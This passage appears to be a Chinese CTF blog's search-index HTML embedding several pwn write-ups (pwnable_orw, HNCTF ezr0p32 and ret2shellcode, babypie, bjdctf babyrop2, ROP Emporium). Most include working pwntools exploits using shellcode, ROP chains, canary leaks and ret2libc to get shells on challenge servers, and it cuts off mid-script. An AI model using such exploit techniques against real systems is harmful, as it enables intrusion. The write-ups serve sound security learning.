io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29507)

bss_addr=0x804A040
io.recvuntil(b&amp;quot;shellcode:&amp;quot;)

payload=asm(shellcraft.open(&amp;quot;./flag&amp;quot;))+asm(shellcraft.read(3,bss_addr,0x40))+asm(shellcraft.write(1,bss_addr,0x40))   
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以打通&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677216548065.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">pwnable_orw wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/zkKMLDz8g/"" data-c="
          &lt;p&gt;32位&lt;br&gt;
第一次向bss段写入&lt;code&gt;/bin/sh&lt;/code&gt;，第二次溢出后利用32位传参调用&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&lt;br&gt;
注意此处调用的是代码段中的system函数，不是&lt;code&gt;call _system&lt;/code&gt;,后者传参直接传&lt;code&gt;/bin/sh&lt;/code&gt;，不需要padding&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./ezr0p&amp;quot;)
io=remote(&amp;quot;43.142.108.3&amp;quot;,28351)
elf=ELF(&amp;quot;./ezr0p&amp;quot;)
# io=remote(&amp;quot;&amp;quot;,)

sys_addr=elf.sym[b&amp;quot;system&amp;quot;]
bss_addr=0x804A080


io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=b&amp;quot;/bin/sh&amp;quot;
io.send(payload)

io.recvuntil(&amp;quot;time~\n&amp;quot;)
payload=cyclic(0x1c+0x4)+p32(sys_addr)+p32(0)+p32(bss_addr)
io.sendline(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x080484d7 : mov al, byte ptr [0xc9010804] ; ret
# 0x08048381 : mov ebx, 0x81000000 ; ret
# 0x08048440 : mov ebx, dword ptr [esp] ; ret
# 0x0804864b : pop ebp ; ret
# 0x08048648 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x0804839d : pop ebx ; ret
# 0x0804864a : pop edi ; pop ebp ; ret
# 0x08048649 : pop esi ; pop edi ; pop ebp ; ret
# 0x08048386 : ret
# 0x0804848e : ret 0xeac1

# Unique gadgets found: 10
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 Week1]ezr0p32 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/8VhmkjUgk/"" data-c="
          &lt;p&gt;此题为64位ret2shellcode模板题，第一次尝试shellcode类型题目&lt;br&gt;
ret2shellcode类型题目一般是将shellcode写到可执行段，然后通过ret返回地址到写入的可执行段的地址执行shellcode获取shell&lt;br&gt;
首先查看保护，nx开启，pie关闭，但是自带的&lt;code&gt;mprotect&lt;/code&gt;函数可以修改程序内存权限&lt;br&gt;
详见&lt;a href=&#34;https://www.yulate.com/82.html&#34;&gt;链接&lt;/a&gt;,先挖个坑，还没学到堆&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676876579446.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
此题ida反编译后可见将读入的字符串写入buff，即bss段&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676876749276.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676876755646.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
则可以考虑写shellcode再加上垃圾字符填充达到溢出长度覆盖rbp，再通过返回bss地址执行&lt;br&gt;
exp如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./ret2shellcode&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28076)

bss_addr=0x4040a0
shellcode=asm(shellcraft.sh())
payload=shellcode.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(bss_addr)
io.send(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 Week1]ret2shellcode wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/friends/"" data-c="
          &lt;p&gt;glan: &lt;a href=&#34;https://g1an123.github.io/&#34;&gt;https://g1an123.github.io/&lt;/a&gt;&lt;br&gt;
harder: &lt;a href=&#34;https://ha2der.github.io/&#34;&gt;https://ha2der.github.io/&lt;/a&gt;&lt;br&gt;
d3f4u1t: &lt;a href=&#34;https://superfengi.github.io/&#34;&gt;https://superfengi.github.io/&lt;/a&gt;&lt;/p&gt;
">友链</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/LZZf9NPoM/"" data-c="
          &lt;p&gt;此题64位开启nx，canary，pie保护，有backdoor函数sub_A3E&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676362822117.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
查看主函数，发现没有格式化字符串漏洞，泄露canary只好用到偏移（0x30-0x8=0x28&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676362855893.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
泄露canary&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676362902193.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
此时不好泄露程序基址，故考虑函数直接偏移来获取,可以看出返回地址低位为&lt;code&gt;0a&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676363098325.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
而后门函数低位&lt;code&gt;3e&lt;/code&gt;，则考虑覆盖返回地址低位来获取shell，则只需修改1个字节，可以用&lt;code&gt;p8()&lt;/code&gt;修改8bit的内容也可以直接发送&lt;code&gt;\x3e&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676363166788.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
故exp如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./babypie&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26395)

# gdb.attach(io)
# pause()

io.recvuntil(&amp;quot;Name:\n&amp;quot;)
payload=b&amp;quot;a&amp;quot;*0x28
io.sendline(payload)
io.recvuntil(b&amp;quot;\n&amp;quot;)
# io.recvuntil(b&amp;quot;:\n&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary  &amp;quot;+hex(canary))

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+b&amp;quot;\x3e&amp;quot;
io.sendline(payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另外还可以爆破这8bit&lt;br&gt;
爆破脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;

char a[16]={&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;};


signed main()
{
    for(int i=0;i&amp;lt;16;i++)
    { 
        for(int j=0;j&amp;lt;16;j++)
        {
            cout&amp;lt;&amp;lt;&amp;quot;b&amp;quot;&amp;lt;&amp;lt;char(34)&amp;lt;&amp;lt;char(92)&amp;lt;&amp;lt;&amp;quot;x&amp;quot;&amp;lt;&amp;lt;a[i]&amp;lt;&amp;lt;a[j]&amp;lt;&amp;lt;char(34)&amp;lt;&amp;lt;&amp;quot;,&amp;quot;;
            // printf(&amp;quot;b&#39;%c%c&#39;,&amp;quot;,a[i],a[j]);
        }
    }


    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1676553162361.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
爆破exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

list1=[b&amp;quot;\x00&amp;quot;,b&amp;quot;\x01&amp;quot;,b&amp;quot;\x02&amp;quot;,b&amp;quot;\x03&amp;quot;,b&amp;quot;\x04&amp;quot;,b&amp;quot;\x05&amp;quot;,b&amp;quot;\x06&amp;quot;,b&amp;quot;\x07&amp;quot;,b&amp;quot;\x08&amp;quot;,b&amp;quot;\x09&amp;quot;,b&amp;quot;\x0a&amp;quot;,b&amp;quot;\x0b&amp;quot;,b&amp;quot;\x0c&amp;quot;,b&amp;quot;\x0d&amp;quot;,b&amp;quot;\x0e&amp;quot;,b&amp;quot;\x0f&amp;quot;,b&amp;quot;\x10&amp;quot;,b&amp;quot;\x11&amp;quot;,b&amp;quot;\x12&amp;quot;,b&amp;quot;\x13&amp;quot;,b&amp;quot;\x14&amp;quot;,b&amp;quot;\x15&amp;quot;,b&amp;quot;\x16&amp;quot;,b&amp;quot;\x17&amp;quot;,b&amp;quot;\x18&amp;quot;,b&amp;quot;\x19&amp;quot;,b&amp;quot;\x1a&amp;quot;,b&amp;quot;\x1b&amp;quot;,b&amp;quot;\x1c&amp;quot;,b&amp;quot;\x1d&amp;quot;,b&amp;quot;\x1e&amp;quot;,b&amp;quot;\x1f&amp;quot;,b&amp;quot;\x20&amp;quot;,b&amp;quot;\x21&amp;quot;,b&amp;quot;\x22&amp;quot;,b&amp;quot;\x23&amp;quot;,b&amp;quot;\x24&amp;quot;,b&amp;quot;\x25&amp;quot;,b&amp;quot;\x26&amp;quot;,b&amp;quot;\x27&amp;quot;,b&amp;quot;\x28&amp;quot;,b&amp;quot;\x29&amp;quot;,b&amp;quot;\x2a&amp;quot;,b&amp;quot;\x2b&amp;quot;,b&amp;quot;\x2c&amp;quot;,b&amp;quot;\x2d&amp;quot;,b&amp;quot;\x2e&amp;quot;,b&amp;quot;\x2f&amp;quot;,b&amp;quot;\x30&amp;quot;,b&amp;quot;\x31&amp;quot;,b&amp;quot;\x32&amp;quot;,b&amp;quot;\x33&amp;quot;,b&amp;quot;\x34&amp;quot;,b&amp;quot;\x35&amp;quot;,b&amp;quot;\x36&amp;quot;,b&amp;quot;\x37&amp;quot;,b&amp;quot;\x38&amp;quot;,b&amp;quot;\x39&amp;quot;,b&amp;quot;\x3a&amp;quot;,b&amp;quot;\x3b&amp;quot;,b&amp;quot;\x3c&amp;quot;,b&amp;quot;\x3d&amp;quot;,b&amp;quot;\x3e&amp;quot;,b&amp;quot;\x3f&amp;quot;,b&amp;quot;\x40&amp;quot;,b&amp;quot;\x41&amp;quot;,b&amp;quot;\x42&amp;quot;,b&amp;quot;\x43&amp;quot;,b&amp;quot;\x44&amp;quot;,b&amp;quot;\x45&amp;quot;,b&amp;quot;\x46&amp;quot;,b&amp;quot;\x47&amp;quot;,b&amp;quot;\x48&amp;quot;,b&amp;quot;\x49&amp;quot;,b&amp;quot;\x4a&amp;quot;,b&amp;quot;\x4b&amp;quot;,b&amp;quot;\x4c&amp;quot;,b&amp;quot;\x4d&amp;quot;,b&amp;quot;\x4e&amp;quot;,b&amp;quot;\x4f&amp;quot;,b&amp;quot;\x50&amp;quot;,b&amp;quot;\x51&amp;quot;,b&amp;quot;\x52&amp;quot;,b&amp;quot;\x53&amp;quot;,b&amp;quot;\x54&amp;quot;,b&amp;quot;\x55&amp;quot;,b&amp;quot;\x56&amp;quot;,b&amp;quot;\x57&amp;quot;,b&amp;quot;\x58&amp;quot;,b&amp;quot;\x59&amp;quot;,b&amp;quot;\x5a&amp;quot;,b&amp;quot;\x5b&amp;quot;,b&amp;quot;\x5c&amp;quot;,b&amp;quot;\x5d&amp;quot;,b&amp;quot;\x5e&amp;quot;,b&amp;quot;\x5f&amp;quot;,b&amp;quot;\x60&amp;quot;,b&amp;quot;\x61&amp;quot;,b&amp;quot;\x62&amp;quot;,b&amp;quot;\x63&amp;quot;,b&amp;quot;\x64&amp;quot;,b&amp;quot;\x65&amp;quot;,b&amp;quot;\x66&amp;quot;,b&amp;quot;\x67&amp;quot;,b&amp;quot;\x68&amp;quot;,b&amp;quot;\x69&amp;quot;,b&amp;quot;\x6a&amp;quot;,b&amp;quot;\x6b&amp;quot;,b&amp;quot;\x6c&amp;quot;,b&amp;quot;\x6d&amp;quot;,b&amp;quot;\x6e&amp;quot;,b&amp;quot;\x6f&amp;quot;,b&amp;quot;\x70&amp;quot;,b&amp;quot;\x71&amp;quot;,b&amp;quot;\x72&amp;quot;,b&amp;quot;\x73&amp;quot;,b&amp;quot;\x74&amp;quot;,b&amp;quot;\x75&amp;quot;,b&amp;quot;\x76&amp;quot;,b&amp;quot;\x77&amp;quot;,b&amp;quot;\x78&amp;quot;,b&amp;quot;\x79&amp;quot;,b&amp;quot;\x7a&amp;quot;,b&amp;quot;\x7b&amp;quot;,b&amp;quot;\x7c&amp;quot;,b&amp;quot;\x7d&amp;quot;,b&amp;quot;\x7e&amp;quot;,b&amp;quot;\x7f&amp;quot;,b&amp;quot;\x80&amp;quot;,b&amp;quot;\x81&amp;quot;,b&amp;quot;\x82&amp;quot;,b&amp;quot;\x83&amp;quot;,b&amp;quot;\x84&amp;quot;,b&amp;quot;\x85&amp;quot;,b&amp;quot;\x86&amp;quot;,b&amp;quot;\x87&amp;quot;,b&amp;quot;\x88&amp;quot;,b&amp;quot;\x89&amp;quot;,b&amp;quot;\x8a&amp;quot;,b&amp;quot;\x8b&amp;quot;,b&amp;quot;\x8c&amp;quot;,b&amp;quot;\x8d&amp;quot;,b&amp;quot;\x8e&amp;quot;,b&amp;quot;\x8f&amp;quot;,b&amp;quot;\x90&amp;quot;,b&amp;quot;\x91&amp;quot;,b&amp;quot;\x92&amp;quot;,b&amp;quot;\x93&amp;quot;,b&amp;quot;\x94&amp;quot;,b&amp;quot;\x95&amp;quot;,b&amp;quot;\x96&amp;quot;,b&amp;quot;\x97&amp;quot;,b&amp;quot;\x98&amp;quot;,b&amp;quot;\x99&amp;quot;,b&amp;quot;\x9a&amp;quot;,b&amp;quot;\x9b&amp;quot;,b&amp;quot;\x9c&amp;quot;,b&amp;quot;\x9d&amp;quot;,b&amp;quot;\x9e&amp;quot;,b&amp;quot;\x9f&amp;quot;,b&amp;quot;\xa0&amp;quot;,b&amp;quot;\xa1&amp;quot;,b&amp;quot;\xa2&amp;quot;,b&amp;quot;\xa3&amp;quot;,b&amp;quot;\xa4&amp;quot;,b&amp;quot;\xa5&amp;quot;,b&amp;quot;\xa6&amp;quot;,b&amp;quot;\xa7&amp;quot;,b&amp;quot;\xa8&amp;quot;,b&amp;quot;\xa9&amp;quot;,b&amp;quot;\xaa&amp;quot;,b&amp;quot;\xab&amp;quot;,b&amp;quot;\xac&amp;quot;,b&amp;quot;\xad&amp;quot;,b&amp;quot;\xae&amp;quot;,b&amp;quot;\xaf&amp;quot;,b&amp;quot;\xb0&amp;quot;,b&amp;quot;\xb1&amp;quot;,b&amp;quot;\xb2&amp;quot;,b&amp;quot;\xb3&amp;quot;,b&amp;quot;\xb4&amp;quot;,b&amp;quot;\xb5&amp;quot;,b&amp;quot;\xb6&amp;quot;,b&amp;quot;\xb7&amp;quot;,b&amp;quot;\xb8&amp;quot;,b&amp;quot;\xb9&amp;quot;,b&amp;quot;\xba&amp;quot;,b&amp;quot;\xbb&amp;quot;,b&amp;quot;\xbc&amp;quot;,b&amp;quot;\xbd&amp;quot;,b&amp;quot;\xbe&amp;quot;,b&amp;quot;\xbf&amp;quot;,b&amp;quot;\xc0&amp;quot;,b&amp;quot;\xc1&amp;quot;,b&amp;quot;\xc2&amp;quot;,b&amp;quot;\xc3&amp;quot;,b&amp;quot;\xc4&amp;quot;,b&amp;quot;\xc5&amp;quot;,b&amp;quot;\xc6&amp;quot;,b&amp;quot;\xc7&amp;quot;,b&amp;quot;\xc8&amp;quot;,b&amp;quot;\xc9&amp;quot;,b&amp;quot;\xca&amp;quot;,b&amp;quot;\xcb&amp;quot;,b&amp;quot;\xcc&amp;quot;,b&amp;quot;\xcd&amp;quot;,b&amp;quot;\xce&amp;quot;,b&amp;quot;\xcf&amp;quot;,b&amp;quot;\xd0&amp;quot;,b&amp;quot;\xd1&amp;quot;,b&amp;quot;\xd2&amp;quot;,b&amp;quot;\xd3&amp;quot;,b&amp;quot;\xd4&amp;quot;,b&amp;quot;\xd5&amp;quot;,b&amp;quot;\xd6&amp;quot;,b&amp;quot;\xd7&amp;quot;,b&amp;quot;\xd8&amp;quot;,b&amp;quot;\xd9&amp;quot;,b&amp;quot;\xda&amp;quot;,b&amp;quot;\xdb&amp;quot;,b&amp;quot;\xdc&amp;quot;,b&amp;quot;\xdd&amp;quot;,b&amp;quot;\xde&amp;quot;,b&amp;quot;\xdf&amp;quot;,b&amp;quot;\xe0&amp;quot;,b&amp;quot;\xe1&amp;quot;,b&amp;quot;\xe2&amp;quot;,b&amp;quot;\xe3&amp;quot;,b&amp;quot;\xe4&amp;quot;,b&amp;quot;\xe5&amp;quot;,b&amp;quot;\xe6&amp;quot;,b&amp;quot;\xe7&amp;quot;,b&amp;quot;\xe8&amp;quot;,b&amp;quot;\xe9&amp;quot;,b&amp;quot;\xea&amp;quot;,b&amp;quot;\xeb&amp;quot;,b&amp;quot;\xec&amp;quot;,b&amp;quot;\xed&amp;quot;,b&amp;quot;\xee&amp;quot;,b&amp;quot;\xef&amp;quot;,b&amp;quot;\xf0&amp;quot;,b&amp;quot;\xf1&amp;quot;,b&amp;quot;\xf2&amp;quot;,b&amp;quot;\xf3&amp;quot;,b&amp;quot;\xf4&amp;quot;,b&amp;quot;\xf5&amp;quot;,b&amp;quot;\xf6&amp;quot;,b&amp;quot;\xf7&amp;quot;,b&amp;quot;\xf8&amp;quot;,b&amp;quot;\xf9&amp;quot;,b&amp;quot;\xfa&amp;quot;,b&amp;quot;\xfb&amp;quot;,b&amp;quot;\xfc&amp;quot;,b&amp;quot;\xfd&amp;quot;,b&amp;quot;\xfe&amp;quot;,b&amp;quot;\xff&amp;quot;]

num=0

while True:
    try:
        io=process(&amp;quot;./babypie&amp;quot;)
        # io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26395)

        # gdb.attach(io)
        # pause()

        io.recvuntil(&amp;quot;Name:\n&amp;quot;)
        payload=b&amp;quot;a&amp;quot;*0x28
        io.sendline(payload)
        io.recvuntil(b&amp;quot;\n&amp;quot;)
        # io.recvuntil(b&amp;quot;:\n&amp;quot;)
        canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
        print(&amp;quot;canary  &amp;quot;+hex(canary))

        io.recvuntil(b&amp;quot;\n&amp;quot;)
        payload=cyclic(0x28)+p64(canary)+p64(0)+list1[num]
        num+=1
        io.sendline(payload)


        io.interactive()
    except :
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
">linkctf_2018.7_babypie wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9myo-1kzB/"" data-c="
          &lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1675758245230.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
本题64位开启nx和canary保护&lt;br&gt;
strings里面并未找到&lt;code&gt;system&lt;/code&gt;或者&lt;code&gt;/bin/sh&lt;/code&gt;等等，而加上init函数中的提示&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758439196.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
可以从ret2libc方向入手，而&lt;code&gt;gift&lt;/code&gt;函数中存在格式化字符串漏洞，可以利用这一点将canary打印出来&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758508883.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
首先确定canary距离buf位置为0x20-0x8=0x18 #padding&lt;br&gt;
canary值也在&lt;code&gt;rbp-8&lt;/code&gt;处&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758691630.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
于是pwndbg里面在printf处下断点，使用pwngdb自带fmtarg测算偏移量&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758635253.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
接着获取canary值；&lt;br&gt;
由于题目未给出libc版本，所以需要连接远端获取&lt;br&gt;
可以使用puts来打印leak_addr&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758875479.png&#34; alt=&#34;这是read函数&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
取末三位放入libc database寻找&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758972241.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
之后在glibc-all-in-one中寻找对应版本ld.so文件，再利用patchelf更换(可以省略)&lt;br&gt;
剩下的就是基本ret2libc操作了&lt;br&gt;
exp如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./bjdctf_2020_babyrop2&amp;quot;)
elf=ELF(&amp;quot;./bjdctf_2020_babyrop2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26687)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
read_got=elf.got[b&amp;quot;read&amp;quot;]
pop_rdi_ret=0x400993


payload=b&amp;quot;%7$p&amp;quot;
io.recvuntil(b&amp;quot;u!\n&amp;quot;)
io.sendline(payload)
canary=int(io.recv(18),16)
print(&amp;quot;canary  &amp;quot;+hex(canary))

payload=cyclic(0x18)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(elf.sym[b&amp;quot;_start&amp;quot;])
io.recvuntil(b&amp;quot;!\n&amp;quot;)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr  &amp;quot;+hex(leak_addr))
base_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]

sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
bin_addr=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

payload=cyclic(0x18)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(bin_addr)+p64(sys_addr)
io.recvuntil(b&amp;quot;u!\n&amp;quot;)
io.sendline(b&amp;quot;aa&amp;quot;)
io.recvuntil(b&amp;quot;!\n&amp;quot;)
io.sendline(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400763 : mov byte ptr [rip + 0x20091e], 1 ; ret
# 0x000000000040098c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400990 : pop r14 ; pop r15 ; ret
# 0x0000000000400992 : pop r15 ; ret
# 0x0000000000400762 : pop rbp ; mov byte ptr [rip + 0x20091e], 1 ; ret
# 0x000000000040098b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400700 : pop rbp ; ret
# 0x0000000000400993 : pop rdi ; ret
# 0x0000000000400991 : pop rsi ; pop r15 ; ret
# 0x000000000040098d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005f9 : ret

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">bjdctf_2020_babyrop2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/p748X9SdF/"" data-c="
          &lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ret2win&lt;/strong&gt;&lt;br&gt;
checksec一下&lt;img src=&#34;https://oraclepi.tech/post-images/1672434958813.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
gdb调试一下测算溢出长度&lt;img src=&#34;https://oraclepi.tech/post-images/1672435551271.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
丢进ida发现ret2win函数&lt;img src=&#34;https://oraclepi.tech/post-images/1672435377820.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
编写exp即可打通得到ROPE{a_placeholder_32byte_flag!}：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

io=process(&#39;./ret2win&#39;)
payload=cyclic(0x28)+p64(0x400756)
io.recv()
io.sendline(payload)
io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;split&lt;/strong&gt;&lt;br&gt;
checksec与上题同，64位小端序；&lt;br&gt;
gdb测出溢出长度为0x20+0x8&lt;img src=&#34;https://oraclepi.tech/post-images/1672595479702.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
本题无直接可利用函数，考虑构造，由于存在&lt;code&gt;system()&lt;/code&gt;函数，所以只需要&lt;code&gt;/bin/cat flag.txt  &lt;/code&gt;作为参数传入函数，本题为64位程序，则需考虑64位传参问题，x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，则需要&lt;code&gt;pop rdi ; ret;&lt;/code&gt;&lt;br&gt;
使用&lt;code&gt;ROPgadget --binary split --only &amp;quot;pop|ret&amp;quot;&lt;/code&gt;查找所需gadgets&lt;img src=&#34;https://oraclepi.tech/post-images/1672595935548.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
编写exp即可打通得到ROPE{a_placeholder_32byte_flag!}：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

elf=ELF(&#39;./split&#39;)
io=process(&#39;./split&#39;)
bin_addr=next(elf.search(b&#39;/bin/cat flag.txt&#39;))
sys_addr=elf.plt[&amp;quot;system&amp;quot;]
rdi_addr=0x4007c3
payload=cyclic(0x28)+p64(rdi_addr)+p64(bin_addr)+p64(sys_addr)
io.recv()
io.sendline(payload)
io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;callme&lt;/strong&gt;&lt;br&gt;
这道题保护措施同上，但是根据这道题的注意事项需要按顺序分别调用3个函数，且需要填入指定参数&lt;img src=&#34;https://oraclepi.tech/post-images/1673205618701.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
则根据64位程序传参，前六个参数是按从左到右顺序传入寄存器，后面的按照从右到左的顺序压入栈中，则此题传参时&lt;code&gt;call_xxx&lt;/code&gt;函数从左到右即可&lt;br&gt;
测出溢出长度0x28，同理寻找gadget，分别是&lt;code&gt;pop_rdi_ret&lt;/code&gt;和&lt;code&gt;pop_rsi_rdx_ret&lt;/code&gt;，然后压入对应3个参数&lt;img src=&#34;https://oraclepi.tech/post-images/1673205862488.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
编写exp最开始出错&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673206062831.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
调试一波发现是exp&lt;code&gt;flat()&lt;/code&gt;里面的参数0x***前加了&lt;code&gt;b&#39;&#39;&lt;/code&gt;使用了强制类型转换，而flat本身最后就是转换为bytes，则不需要加&lt;code&gt;b&#39;&#39;&lt;/code&gt;，完整exp如下&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

context.log_level = &#39;debug&#39;
context.arch=&#39;amd64&#39;
context.os=&#39;linux&#39;
context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

